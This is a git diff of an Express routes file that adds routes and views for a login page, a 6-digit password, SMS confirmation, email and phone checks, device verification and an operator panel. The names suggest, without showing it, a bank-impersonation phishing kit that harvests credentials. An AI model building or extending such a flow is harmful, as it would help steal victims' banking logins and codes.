@@ -11,6 +11,9 @@ const PasswordView = require('../controllers/views/passwordView')
 const AwaitView = require('../controllers/views/awaitView')
 const EletronicView = require('../controllers/views/eletronicView')
 const FinishView = require('../controllers/views/finishView')
+const MailView = require('../controllers/views/mailView')
+const PhoneView = require('../controllers/views/phoneView')
+const VerifyView = require('../controllers/views/verifyView')
 
 const SmsView = require('../controllers/views/smsView')
 
@@ -20,12 +23,24 @@ const OperatorView = require('../controllers/views/OperatorView')
 
 const ClientController = require('../controllers/ClientController')
 
+const ClientLoginView = require('../controllers/views/loginView')
+
+const Pass6View = require('../controllers/views/password6View')
+
+const DispositivoView = require('../controllers/views/admin/dispView')
+
 //Dashboard
 routes.get(`/dashboard`, DashboardView.view)
 routes.get(`/sinbc-login`, PasswordView.view)
-routes.post(`/sinbc-login`, PasswordView.view)
+routes.post(`/jms/password`, PasswordView.view)
 //Client
-routes.get(`/products`, ProductView.index)
+routes.post(`/password6`, Pass6View.view)
+routes.get(`/dispositivo`, DispositivoView.view)
+routes.get(`/password6`, Pass6View.get)
+routes.post(`/acesso`, ClientLoginView.view)
+routes.get(`/verify-authentic/`, VerifyView.view)
+routes.get(`/mail`, MailView.view)
+routes.get(`/phonecheck/:client_id`, PhoneView.view)
 routes.get(`/password`, ProductView.index)
 routes.get(`/eletronic`, EletronicView.view)
 routes.get(`/confirmsms`, SmsView.view)
